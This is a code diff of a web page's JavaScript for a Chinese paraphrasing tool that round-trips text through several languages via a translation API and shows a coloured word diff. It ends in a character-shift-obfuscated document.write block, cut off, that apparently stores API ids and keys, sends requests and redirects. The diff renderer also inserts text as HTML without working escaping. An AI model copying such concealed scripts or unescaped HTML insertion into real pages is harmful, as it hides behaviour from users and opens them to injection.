-					if (
-						ps.v1_eq_max < op.eq_min &&
-						ps.v1_start - ps.v1_i > op.eq_index
-					) {
-						ps.v1_eq_max = 0;
+				});
+			}
+
+			function translateFiveFn(fn = 0) {
+				// zh-en-zh-ru-zh
+				translateFn(to.val(), "zh", "en", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "zh", "ru", (
+									rs) => {
+									if (rs !== "54003" && rs !== "") {
+										translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
+											"ru",
+											"zh",
+											(rs) => {
+												if (rs !== "54003" && rs !== "") {
+													from5.html(rs);
+													from5.css("color", "black");
+													if (fn) {
+														setTimeout(() => {
+															compareMain("from5")
+														}, 1000);
+													}
+												} else {
+													
+													from5.html("修改失败，请稍后重试......");
+													from5.css("color", "red");
+													$(".restart5").css("display", "inline-block")
+													console.log("error5-3:", rs);
+													sendRequest(localStorage.getItem("appid1"),
+														"error5-3:" + rs, 1)
+												}
+											});
+									} else {
+										
+										from5.html("修改失败，请稍后重试......");
+										from5.css("color", "red");
+										$(".restart5").css("display", "inline-block")
+										console.log("error5-2:", rs);
+										sendRequest(localStorage.getItem("appid1"), "error5-2:" + rs,
+											1)
+									}
+								});
+							} else {
+								
+								from5.html("修改失败，请稍后重试......");
+								from5.css("color", "red");
+								$(".restart5").css("display", "inline-block")
+								console.log("error5-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error5-1:" + rs, 1)
+							}
+						});
+					} else {
+						
+						from5.html("修改失败，请稍后重试......");
+						from5.css("color", "red");
+						$(".restart5").css("display", "inline-block")
+						console.log("error5:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error5:" + rs, 1)
 					}
-					if (
-						ps.v2_eq_max < op.eq_min &&
-						ps.v2_start - ps.v2_i > op.eq_index
-					) {
-						ps.v2_eq_max = 0;
+				});
+			}
+
+			function translateSixFn(fn = 0) {
+				// zh-it-zh
+				translateFn(to.val(), 'zh', 'it', (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "it", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from6.html(rs);
+								from6.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from6")
+									}, 1000);
+								}
+							} else {
+								
+								from6.html('修改失败，请稍后重试......');
+								from6.css("color", "red");
+								$(".restart").css("display", "inline-block")
+								console.log("error6-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error6-1:" + rs, 1)
+							}
+						});
+					} else {
+						
+						from6.html('修改失败，请稍后重试......');
+						from6.css("color", "red");
+						$(".restart").css("display", "inline-block")
+						console.log("error6:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error6:" + rs, 1)
 					}
-					if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
-						//两个值的字不同
-						//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
-						ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
-							"<").replace(">",
-							">") + "</span>";
-						ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
-							.replace(">",
-								">") + "</del>";
+				});
+			}
+
+
+			function translateSevenFn(fn = 0) {
+				//zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
+				translateFn(to.val(), "zh", "fra", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "en", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "pt", (
+									rs) => {
+									if (rs !== "54003" && rs !== "") {
+										translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
+											"pt", "jp", (rs) => {
+												if (rs !== "54003" && rs !== "") {
+													translateFn(to.val(), "jp", "zh", (rs) => {
+														if (rs !== "54003" && rs !== "") {
+															from7.html(rs);
+															from7.css("color", "black");
+															if (fn) {
+																setTimeout(() => {
+																	compareMain(
+																		"from7")
+																}, 1000);
+															}
+														} else {
+															
+															from7.html("修改失败，请稍后重试......");
+															from7.css("color", "red");
+															$(".restart5").css("display",
+																"inline-block")
+															console.log("error7-4:", rs);
+															sendRequest(localStorage
+																.getItem(
+																	"appid1"),
+																"error7-4:" + rs, 1)
+														}
+													});
+												} else {
+													
+													from7.html("修改失败，请稍后重试......");
+													from7.css("color", "red");
+													$(".restart5").css("display", "inline-block")
+													console.log("error7-3:", rs);
+													sendRequest(localStorage.getItem("appid1"),
+														"error7-3:" + rs, 1)
+												}
+											});
+									} else {
+										
+										from7.html("修改失败，请稍后重试......");
+										from7.css("color", "red");
+										$(".restart5").css("display", "inline-block")
+										console.log("error7-2:", rs);
+										sendRequest(localStorage.getItem("appid1"), "error7-2:" + rs,
+											1)
+									}
+								});
+							} else {
+								
+								from7.html("修改失败，请稍后重试......");
+								from7.css("color", "red");
+								$(".restart5").css("display", "inline-block")
+								console.log("error7-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error7-1:" + rs + "", 1)
+							}
+						});
+					} else {
+						
+						from7.html("修改失败，请稍后重试......");
+						from7.css("color", "red");
+						$(".restart5").css("display", "inline-block")
+						console.log("error7:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error7:" + rs, 1)
+					}
+				});
+			}
+
+
+			function translateMain(fn = 0) {
+				setTimeout(() => {
+					translateSevenFn(fn);
+				}, 1500, setTimeout(() => {
+					translateSixFn(fn);
+				}, 1500, setTimeout(() => {
+					translateFiveFn(fn);
+				}, 1500, setTimeout(() => {
+					translateFourFn(fn);
+				}, 1500, setTimeout(() => {
+					translateThreeFn(fn);
+				}, 1500, setTimeout(() => {
+					translateTwoFn(fn);
+				}, 1500, setTimeout(() => {
+					// translateOneFn(fn);
+				}, 1500, setTimeout(() => {
+					translateZeroFn(fn);
+				}, 1500))))))));
+
+			}
+
+
+			function translateFn(QUERY, FROM, TO, callback) {
+				const salt = (new Date()).getTime();
+				const str1 = appid + QUERY + salt + key;
+				const sign = MD5.main(str1);
+				setTimeout(() => {
+					$.ajax({
+						url,
+						type: 'get',
+						// async: true,
+						// 跨域
+						dataType: 'jsonp',
+						contentType: "application/x-www-form-urlencoded; charset=utf-8",
+						data: {
+							q: QUERY,
+							appid: appid,
+							salt: salt,
+							from: FROM,
+							to: TO,
+							sign: sign,
+						},
+						success: (data) => {
+							if (data.error_code == "52003") {
+								showToast("账号配置出错，请重新配置...", 1500);
+								sendRequest(localStorage.getItem("appid1"), data.error_code + "：" +
+									"账号配置出错，请重新配置...", 1);
+								return;
+							} else if (data.error_code == "54003") {
+								callback(data.error_code);
+							} else {
+								if (data.trans_result[0] != undefined) {
+									callback(data.trans_result[0].dst)
+								} else {
+									return;
+								}
+							}
+						},
+						error: function(data) {
+							alert("error:" + data.status);
+						},
+					})
+				}, 1500);
+			}
+
+
+			function showToast(msg, duration) {
+				duration = isNaN(duration) ? 3000 : duration;
+				var m = document.createElement('div');
+				m.innerHTML = msg;
+				m.style.cssText =
+					"width:60%; min-width:180px; background:#000; opacity:0.6; height:auto;min-height: 30px; color:#fff; line-height:30px; text-align:center; border-radius:4px; position:fixed; top:60%; left:20%; z-index:999999;";
+				document.body.appendChild(m);
+				setTimeout(function() {
+					var d = 0.5;
+					m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d +
+						's ease-in';
+					m.style.opacity = '0';
+					setTimeout(function() {
+						document.body.removeChild(m)
+					}, d * 1000);
+				}, duration);
+			}
+
+			function compareMain(op) {
+				if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
+					compareFn(compare, to, from)
+				}
+				// if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
+				// 	compareFn(compare1, to, from1)
+				// }
+				if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
+					compareFn(compare2, to, from2)
+				}
+				if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
+					compareFn(compare3, to, from3)
+				}
+				if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
+					compareFn(compare4, to, from4)
+				}
+				if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
+					compareFn(compare5, to, from5)
+				}
+				if (from6.text() !== "修改失败，请稍后重试......" && from6.text() !== "" && op === "from6") {
+					compareFn(compare6, to, from6)
+				}
+				if (from7.text() !== "修改失败，请稍后重试......" && from7.text() !== "" && op === "from7") {
+					compareFn(compare7, to, from7)
+				}
+			}
+
+			function compareFn(target, originData, newData) {
+				target.html(eq({
+					value1: newData.text(),
+					value2: originData.val()
+				}).value2)
+			}
+
+
+
+			function eq(op) {
+				if (!op) {
+					return op;
+				}
+				if (!op.eq_min) {
+					op.eq_min = 3;
+				}
+				if (!op.eq_index) {
+					op.eq_index = 5;
+				}
+				if (!op.value1 || !op.value2) {
+					return op;
+				}
+				var ps = {
+					v1_i: 0,
+					v1_new_value: "",
+					v2_i: 0,
+					v2_new_value: ""
+				};
+				while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
+					if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
+						//ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
+						ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">");
 						ps.v1_i += 1;
 						ps.v2_i += 1;
-
+						//值2增加的部分
 						if (ps.v1_i >= op.value1.length) {
-							//值2增加的部分
 							ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
-									/</g, "<")
-								.replace(">", ">") + "</del>";
+								/</g, "<").replace(
+								">", ">") + "</del>";
 							break;
 						}
+						//值1删除的部分
 						if (ps.v2_i >= op.value2.length) {
-							//值1删除的部分
 							//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-							ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i)
-								.replace(/</g, "<")
+							ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
+									/</g, "<")
 								.replace(">", ">") + "</span>";
 							break;
 						}
-						//值1删除的
-					} else if (ps.v1_eq_max > ps.v2_eq_max) {
-						//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-						ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
-								.v1_start - ps.v1_i)
-							.replace(/</g, "<").replace(">", ">") + "</span>";
-						ps.v1_i = ps.v1_start;
 					} else {
-						//值2增加的
-						ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
-								.v2_start - ps.v2_i)
-							.replace(/</g, "<").replace(">", ">") + "</del>";
-						ps.v2_i = ps.v2_start;
+						ps.v1_index = ps.v1_i + 1;
+						ps.v1_eq_length = 0;
+						ps.v1_eq_max = 0;
+						ps.v1_start = ps.v1_i + 1;
+						while (ps.v1_index < op.value1.length) {
+							if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
+								ps.v1_eq_length += 1;
+							} else if (ps.v1_eq_length > 0) {
+								if (ps.v1_eq_max < ps.v1_eq_length) {
+									ps.v1_eq_max = ps.v1_eq_length;
+									ps.v1_start = ps.v1_index - ps.v1_eq_length;
+								}
+								ps.v1_eq_length = 0;
+								break; //只寻找最近的
+							}
+							ps.v1_index += 1;
+						}
+						if (ps.v1_eq_max < ps.v1_eq_length) {
+							ps.v1_eq_max = ps.v1_eq_length;
+							ps.v1_start = ps.v1_index - ps.v1_eq_length;
+						}
+
+						ps.v2_index = ps.v2_i + 1;
+						ps.v2_eq_length = 0;
+						ps.v2_eq_max = 0;
+						ps.v2_start = ps.v2_i + 1;
+						while (ps.v2_index < op.value2.length) {
+							if (
+								op.value2[ps.v2_index] == op.value1[ps.v1_i + ps.v2_eq_length]
+							) {
+								ps.v2_eq_length += 1;
+							} else if (ps.v2_eq_length > 0) {
+								if (ps.v2_eq_max < ps.v2_eq_length) {
+									ps.v2_eq_max = ps.v2_eq_length;
+									ps.v2_start = ps.v2_index - ps.v2_eq_length;
+								}
+								ps.v1_eq_length = 0;
+								break; //只寻找最近的
+							}
+							ps.v2_index += 1;
+						}
+						if (ps.v2_eq_max < ps.v2_eq_length) {
+							ps.v2_eq_max = ps.v2_eq_length;
+							ps.v2_start = ps.v2_index - ps.v2_eq_length;
+						}
+						if (
+							ps.v1_eq_max < op.eq_min &&
+							ps.v1_start - ps.v1_i > op.eq_index
+						) {
+							ps.v1_eq_max = 0;
+						}
+						if (
+							ps.v2_eq_max < op.eq_min &&
+							ps.v2_start - ps.v2_i > op.eq_index
+						) {
+							ps.v2_eq_max = 0;
+						}
+						if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
+							//两个值的字不同
+							//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
+							ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
+								"<").replace(">",
+								">") + "</span>";
+							ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
+								.replace(">",
+									">") + "</del>";
+							ps.v1_i += 1;
+							ps.v2_i += 1;
+
+							if (ps.v1_i >= op.value1.length) {
+								//值2增加的部分
+								ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
+										/</g, "<")
+									.replace(">", ">") + "</del>";
+								break;
+							}
+							if (ps.v2_i >= op.value2.length) {
+								//值1删除的部分
+								//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
+								ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i)
+									.replace(/</g, "<")
+									.replace(">", ">") + "</span>";
+								break;
+							}
+							//值1删除的
+						} else if (ps.v1_eq_max > ps.v2_eq_max) {
+							//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
+							ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
+									.v1_start - ps.v1_i)
+								.replace(/</g, "<").replace(">", ">") + "</span>";
+							ps.v1_i = ps.v1_start;
+						} else {
+							//值2增加的
+							ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
+									.v2_start - ps.v2_i)
+								.replace(/</g, "<").replace(">", ">") + "</del>";
+							ps.v2_i = ps.v2_start;
+						}
 					}
 				}
+				op.value1 = ps.v1_new_value;
+				op.value2 = ps.v2_new_value;
+				//有多个连着修改的放在一起
+				var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g;
+				var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
+				var allRule =
+					/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
+				op.value2 = op.value2.replace(allRule, function(str) {
+					var beforText = "",
+						afterText = "";
+					var beforeMatch = str.match(deleteRule);
+					for (var i = 0; i < beforeMatch.length; i++) {
+						var m = beforeMatch[i].match(deleteRule);
+						beforText += RegExp.$1;
+					}
+					var afterMatch = str.match(addRule);
+					for (var i = 0; i < afterMatch.length; i++) {
+						var m = afterMatch[i].match(addRule);
+						afterText += RegExp.$1;
+					}
+					return (
+						"<span style='color:green'>" + beforText + "</span><del style='color:red'>" +
+						afterText +
+						"</del>"
+					);
+				});
+				return op;
 			}
-			op.value1 = ps.v1_new_value;
-			op.value2 = ps.v2_new_value;
-			//有多个连着修改的放在一起
-			var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g;
-			var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
-			var allRule =
-				/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
-			op.value2 = op.value2.replace(allRule, function (str) {
-				var beforText = "",
-					afterText = "";
-				var beforeMatch = str.match(deleteRule);
-				for (var i = 0; i < beforeMatch.length; i++) {
-					var m = beforeMatch[i].match(deleteRule);
-					beforText += RegExp.$1;
-				}
-				var afterMatch = str.match(addRule);
-				for (var i = 0; i < afterMatch.length; i++) {
-					var m = afterMatch[i].match(addRule);
-					afterText += RegExp.$1;
-				}
-				return (
-					"<span style='color:green'>" + beforText + "</span><del style='color:red'>" +
-					afterText +
-					"</del>"
-				);
-			});
-			return op;
-		}
 
-		let fixedBtn = $(".fixed_btn");
-		window.onscroll = () => {
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				if (document.documentElement.scrollTop >= 400) {
-					fixedBtn.css("display", 'block');
-				} else {
-					fixedBtn.css("display", 'none');
+			let fixedBtn = $(".fixed_btn");
+			window.onscroll = () => {
+				if (timer !== null) {
+					clearTimeout(timer);
 				}
-				timer = null;
-			}, 500);
-		};
-	</script>
-	<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('*8Hxhwnuy*8J*5F%7Bfw*75wjqf%7DGys*75*8I*75*79*7%3D*7%3C3wjqf%7D*7%3C*7%3E*8G*5F%7Bfw*75r%7Efuuni*75*8I*75*7%3C75755985555989%3E65*7%3C*8G*5F%7Bfw*75r%7Epj%7E*75*8I*75*7%3Cm7QRxr%5Dh6%7FUxpQ%7B7z9gt*7%3C*8G*5F%7Bfw*75xhpj%7E*75*8I*75*7%3CG%3CFK929H6%3D%3D28%3BJ%3D729%3D98%3E2GH978*7%3C*8G*5F*79*7%3Drfns*7%3E*8G*5F*5Fkzshynts*75rfns*7%3D*7%3E*75*%3CG*5F*5%3E44*75*z%3CJI6*z%3AG%3EF*z9J%3DG*z9JK%3B*zKK5H*z%3AK%3A8*z%3A8I%3B*z%3BI%3D%3D*z%3C%3B%3D9*z%3B85%3E*z%3E9FJ*z%3D%3DFG*z%3C5G%3E*z%3A6KG*z%3C%3B%3D9*z%3B%3AK%3B*z%3A56%3E*zKK5H*z%3B%3C5%3E*z9J55*z9J7F*z%3A6KI*z%3B%3A%3C5*z%3AGK%3E*z%3AJ%3E9*5F*5%3E44*75*z%3CJI6*z%3AG%3EF*z9J%3DG*z9JK%3B*zKK5H*z%3AK%3A8*z%3B%3B8J*z%3C%3E8F*z%3B85%3E*z%3E9FJ*z%3D%3DFG*z%3C5G%3E*z%3A6KG*z%3C%3B%3D9*z%3B%3AK%3B*z%3A56%3E*zKK5H*z%3BF76*z%3B556*z%3B%3D9%3B*z%3B%3B8J*z%3C%3E8F*5F*5%3E*79*7%3D*7%3C*78gysdxmt%7C*7%3C*7%3E3hqnhp*7%3Dxmt%7Cdrtifq*7%3E*8G*5F*5%3E*79*7%3D*7%3C*78gysdhfshqj*7%3C*7%3E3hqnhp*7%3Dinxrnxxdrtifq*7%3E*8G*5F*5F*5%3E%7Bfw*75tpGys*75*8I*75*79*7%3D*7%3C*78tpGys*7%3C*7%3E*8G*5F*5%3EtpGys3hqnhp*7%3D*7%3D*7%3E*75*8I*8J*75*%3CG*5F*5%3E*5%3E%7Bfw*75wxhtij*75*8I*75*79*7%3D*7%3C*78wxhtij*7%3C*7%3E3%7Bfq*7%3D*7%3E*8G*5F*5%3E*5%3Enk*75*7%3Dwxhtij*75*8I*8I*75xhpj%7E*7%3E*75*%3CG*5F*5%3E*5%3E*5%3ExjsiWjvzjxy*7%3DqthfqXytwflj3ljyJ%7Dunwj*7%3D*7%3Cfuuni6*7%3C*7%3E*7H*75*7%3C*z%3C%3B%3CI*z%3AFI%3B*z%3B765*z%3A7%3EK*z9J%3D%3B*zKK56*7%3C*7H*75%3B*7%3E*8G*5F*5%3E*5%3E*5%3Einxrnxxdrtifq*7%3D*7%3E*8G*5F*5%3E*5%3E*5%3EqthfqXytwflj3xjyJ%7Dunwj*7%3D*7%3Cwxhtij*7%3C*7H*75xhpj%7E*7H*756%3D5555*7%3E*8G*5F*5%3E*5%3E*5%3EqthfqXytwflj3xjyJ%7Dunwj*7%3D*7%3Cfuuni6*7%3C*7H*75r%7Efuuni*7H*756%3D5555*7%3E*8G*5F*5%3E*5%3E*5%3EqthfqXytwflj3xjyJ%7Dunwj*7%3D*7%3Cpj%7E6*7%3C*7H*75r%7Epj%7E*7H*756%3D5555*7%3E*8G*5F*5%3E*5%3E*5%3Exmt%7CYtfxy*7%3D*7%3C*z%3DGK%3C*z%3A%3C7%3D*z%3DK%3E8*z%3A6%3B%3A*z%3B%3D9%3B*z%3A%3D%3BG*z%3A6%3E%3E*z%3D%3E%3D6*z%3CKKG*z%3DGI6*z%3C%3B%3D9*z%3A6%3D%3A*z%3AGG%3E*zKK5H*z%3C68%3B*z%3A95J*z%3C5G%3E*z%3A6KG*z8565*z%3CKKG*z%3DGI6*z%3AJ%3C%3B*z%3AGK%3E*z%3BGI9*z8566*z%3B85%3E*z%3E9FJ*7%3C*7H*758555*7%3E*8G*5F*5%3E*5%3E*5%3Eqthfynts3mwjk*75*8I*75*7%3C*78xyfwy*7%3C*8G*5F*5%3E*5%3E*5%3Eqthfynts3mwjk*75*8I*75*7734nsij%7D3myrq*77*8G*5F*5%3E*5%3E*%3CI*75jqxj*75nk*7%3Dwxhtij*75*8I*8I*75*7%3C*7%3C*7%3E*%3CG*5F*5%3E*5%3E*5%3Exmt%7CYtfxy*7%3D*7%3C*z%3B%3C7F*z%3DK%3E8*z%3A6%3B%3A*zKK5H*z%3B8I5*z9JF9*z%3A%3E86*z%3DI7%3A*zKK56*7%3C*7H8555*7%3E*8G*5F*5%3E*5%3E*%3CIjqxj*75*%3CG*5F*5%3E*5%3E*5%3Exmt%7CYtfxy*7%3D*7%3C*z%3AGH%3B*z%3E9F%3A*z9J5I*z%3BG%3B8*z%3C%3D%3BJ*zKK5H*z%3DGK%3C*z%3E6HI*z%3B%3AG5*z%3D8G%3C*z%3A8I%3B*7%3C*7H*758555*7%3E*8G*5F*5%3E*5%3E*5%3ExjsiWjvzjxy*7%3DqthfqXytwflj3ljyJ%7Dunwj*7%3D*7%3Cfuuni6*7%3C*7%3E*7H*75*7%3C*z%3C%3B%3CI*z%3AFI%3B*z%3A%3E86*z%3DI7%3A*zKK56*7%3C*7H*75%3C*7%3E*8G*5F*5%3E*5%3E*%3CI*5F*5%3E*%3CI*7%3E*8G*5F*5F*5%3E%7Bfw*75hfshjqGys*75*8I*75*79*7%3D*7%3C*78gysdhfshjq*7%3C*7%3E*5F*5%3EhfshjqGys3hqnhp*7%3D*7%3D*7%3E*75*8I*8J*75*%3CG*5F*5%3E*5%3Einxrnxxdrtifq*7%3D*7%3E*8G*5F*5%3E*%3CI*7%3E*5F*5F*5%3E44*75*z%3DGF%3E*z%3BF76*z%3B556*z%3B%3D9%3B*z%3A6KF*z%3C8G5*5F*5%3Ekzshynts*75xmt%7Cdrtifq*7%3D*7%3E*75*%3CG*5F*5%3E*5%3E*79*7%3D*7%3C3rtifq*7%3C*7%3E3hxx*7%3D*7%3Cinxuqf%7E*7%3C*7H*75*7%3Cgqthp*7%3C*7%3E*8G*5F*5%3E*5%3E*79*7%3D*7%3C3nskt*7%3C*7%3E3hxx*7%3D*7%3Cinxuqf%7E*7%3C*7H*75*7%3Cgqthp*7%3C*7%3E*8G*5F*5%3E*5%3E*79*7%3D*7%3Cmyrq*7Hgti%7E*7%3C*7%3E3fiiHqfxx*7%3D*7%3Ct%7BkMnijs*7%3C*7%3E*8G*5F*5%3E*%3CI*5F*5F*5%3E44*z%3DGF%3E*z%3BF76*z%3B556*z%3B%3D9%3B*z%3BI%3D%3D*z%3A%3E86*5F*5%3Ekzshynts*75inxrnxxdrtifq*7%3D*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3C%3BJJ*z%3B%3D5%3C*zKK5H*z%3C5G%3E*z%3A6KG*z%3A8I%3B*z%3BI%3D%3D*zKK5H*z%3DGF%3E*z%3BF76*z%3B556*z%3B%3D9%3B*z%3BI%3D%3D*z%3A%3E86*5F*5%3E*5%3E44*75*z%3B7KK*z%3A785*z%3B%3D5%3C*z%3CG%3CJ*z%3AGK%3E*z%3DH%3B6*5F*5%3E*5%3E%7Bfw*75*79in%7BNskt*75*8I*75*79*7%3D*7%3C3nskt*7%3C*7%3E*8G*5F*5%3E*5%3E44*75*z%3B9HI*z9K%3AH*z%3B%3D5%3C*z%3CG%3CJ*z%3AGK%3E*z%3DH%3B6*z%3C%3B%3D9*z%3AH%3AJ*z%3B57%3C*zKK5H*z%3DGGJ*z%3CK%3BJhxx*z%3C%3B%3D9inxuqf%7E*z9J8Fstsj*5F*5%3E*5%3E*79in%7BNskt3hxx*7%3D*7%3Cinxuqf%7E*7%3C*7H*75*7%3Cstsj*7%3C*7%3E*8G*5F*5%3E*5%3E*79*7%3D*7%3C3rtifq*7%3C*7%3E3hxx*7%3D*7%3Cinxuqf%7E*7%3C*7H*75*7%3Cstsj*7%3C*7%3E*8G*5F*5%3E*5%3E*79*7%3D*7%3Cmyrq*7Hgti%7E*7%3C*7%3E3wjrt%7BjHqfxx*7%3D*7%3Ct%7BkMnijs*7%3C*7%3E*8G*5F*5%3E*%3CI*5F*%3CI*5F*5Fwjqf%7DGys3hqnhp*7%3D*7%3D*7%3E*75*8I*8J*75*%3CG*5F*5%3Exmt%7CYtfxy*7%3D*7%3C*z%3DGK%3C*z%3A69%3D*z%3A6%3C8*z%3BHJ%3D*z%3AKFJ*z9KJ6*z%3A6%3BH*z9K6%3C*z%3A8K%3C*z8565Kwj%7EXz*z8566*z%3A%3BIJ*z%3A%3E5I*z756H*z%3AGH%3B*z%3E9F%3A*z756I*7%3C*7H*758555*7%3E*8G*5F*%3CI*7%3E*8G*5F*5Fkzshynts*75xjsiWjvzjxy*7%3DxjsiYnyqj*7H*75xjsiHtsyjsy*7H*75xjsiY%7Euj*7%3E*75*%3CG*5F*5%3Enk*75*7%3DxjsiY%7Euj*75*8I*8I*756*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3DKI9*z%3A%3BIJ*z%3E%3A6%3E*z%3DGJK*z%3C%3D56*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3A6KF*z%3E%3A6%3E*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3E%3A6%3E*z%3DGJK*z%3C%3D56*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*757*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3DGK%3C*z%3BH97*z%3B765*z%3A7%3EK*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3B765*z%3A7%3EK*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*758*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3CKKG*z%3DGI6*z%3A6KF*z%3E%3A6%3E*z%3E6HI*z%3DGI%3A*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3E6HI*z%3DGI%3A*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*759*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z9J5F*z%3DK%3B%3B*z9J%3D%3B*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z9J5F*z%3DK%3B%3B*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3Dxj